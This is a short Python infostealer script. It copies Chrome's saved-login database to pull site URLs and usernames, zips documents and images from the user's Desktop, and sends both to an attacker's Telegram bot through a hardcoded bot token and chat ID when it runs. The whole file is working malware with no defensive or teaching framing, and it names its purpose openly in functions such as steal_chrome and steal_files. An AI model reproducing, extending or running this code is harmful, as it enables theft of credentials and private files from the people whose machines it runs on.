import os, shutil, sqlite3, json, base64, requests, zipfile, tempfile, sys

TOKEN = "7937322538:AAGcpTMZ0v2_2bcN2txtkTlRyI-IRcj0kQI"
CHAT_ID = "8951614421"

def send_telegram(text, file_path=None):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=10)
        if file_path and os.path.exists(file_path):
            url_doc = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            with open(file_path, "rb") as f:
                requests.post(url_doc, data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
    except:
        pass

def steal_chrome():
    try:
        login_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        if not os.path.exists(login_db):
            return "Chrome DB not found"
        temp_db = os.path.join(tempfile.gettempdir(), "temp_login.db")
        shutil.copy2(login_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value FROM logins")
        results = [f"URL: {r[0]}\nUSER: {r[1]}\n" for r in cursor.fetchall()]
        cursor.close()
        conn.close()
        os.remove(temp_db)
        return "\n".join(results) if results else "No saved passwords"
    except Exception as e:
        return f"Error: {e}"

def steal_files():
    desktop = os.path.join(os.environ["USERPROFILE"], "Desktop")
    temp_zip = os.path.join(tempfile.gettempdir(), "stolen_files.zip")
    try:
        with zipfile.ZipFile(temp_zip, 'w') as zipf:
            for root, dirs, files in os.walk(desktop):
                for file in files:
                    if file.endswith(('.txt', '.pdf', '.doc', '.docx', '.png', '.jpg')):
                        zipf.write(os.path.join(root, file), file)
        return temp_zip
    except:
        return None

if __name__ == "__main__":
    passes = steal_chrome()
    send_telegram(f"=== CHROME PASSWORDS ===\n{passes}")
    zip_path = steal_files()
    if zip_path:
        send_telegram("=== DESKTOP FILES ===", zip_path)
